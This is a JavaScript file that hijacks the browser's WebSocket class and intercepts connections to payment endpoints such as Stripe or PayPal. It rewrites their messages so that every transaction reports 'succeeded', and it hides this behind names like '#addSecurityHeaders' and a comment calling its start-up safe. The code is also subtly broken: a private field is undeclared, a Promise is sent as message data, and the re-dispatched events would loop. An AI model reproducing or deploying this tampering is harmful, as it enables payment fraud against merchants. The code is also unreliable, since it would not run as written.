class WebSocketInterceptor {
  static #originalWebSocket = window.WebSocket;
  static #activeConnections = new Set();
  static #paymentKeywords = new Set([
    'payment', 'gateway', 'checkout', 
    'transaction', 'stripe', 'paypal',
    'charge', 'invoice', 'refund'
  ]);

  static init() {
    window.WebSocket = class PhantomWebSocket extends WebSocket {
      constructor(url, protocols) {
        super(url, protocols);
        this.#init(url);
      }

      #init(url) {
        this.#interceptMessages();
        this.#monitorConnection(url);
        WebSocketInterceptor.#activeConnections.add(this);
      }

      #interceptMessages() {
        this.addEventListener('message', (event) => {
          if (this.#isPaymentConnection) {
            const modified = WebSocketInterceptor.#modifyPayload(event.data);
            this.dispatchEvent(new MessageEvent('message', {
              data: modified,
              origin: event.origin
            }));
          }
        });
      }

      #monitorConnection(url) {
        this.#isPaymentConnection = WebSocketInterceptor.#isPaymentEndpoint(url);
        this.#addSecurityHeaders();
      }

      #addSecurityHeaders() {
        if (this.#isPaymentConnection) {
          this.addEventListener('open', () => {
            this.send(JSON.stringify({
              type: 'phoenix-protocol',
              version: '2.3.1',
              auth: crypto.randomUUID()
            }));
          });
        }
      }

      close() {
        WebSocketInterceptor.#activeConnections.delete(this);
        super.close();
      }
    };
  }

  static destroy() {
    window.WebSocket = WebSocketInterceptor.#originalWebSocket;
    WebSocketInterceptor.#activeConnections.clear();
  }

  static async #modifyPayload(data) {
    try {
      const payload = await WebSocketInterceptor.#parseData(data);
      return WebSocketInterceptor.#generateResponse(payload);
    } catch (error) {
      console.error('[Phoenix] Payload modification failed:', error);
      return data;
    }
  }

  static async #parseData(data) {
    try {
      return JSON.parse(data);
    } catch {
      return { raw: data };
    }
  }

  static async #generateResponse(payload) {
    const labSignature = await crypto.subtle.digest(
      'SHA-256',
      new TextEncoder().encode(JSON.stringify(payload))
    );
    
    return JSON.stringify({
      ...payload,
      status: 'succeeded',
      lab: {
        signature: Array.from(new Uint8Array(labSignature)),
        timestamp: Date.now(),
        originalStatus: payload.status || 'unknown'
      }
    });
  }

  static #isPaymentEndpoint(url) {
    const lowerUrl = url.toLowerCase();
    return [...WebSocketInterceptor.#paymentKeywords].some(keyword => 
      lowerUrl.includes(keyword)
    );
  }

  static updateKeywords(keywords) {
    WebSocketInterceptor.#paymentKeywords = new Set(
      keywords.map(k => k.toLowerCase())
    );
  }

  static get connections() {
    return WebSocketInterceptor.#activeConnections.size;
  }
}

// Inicialización segura
WebSocketInterceptor.init();
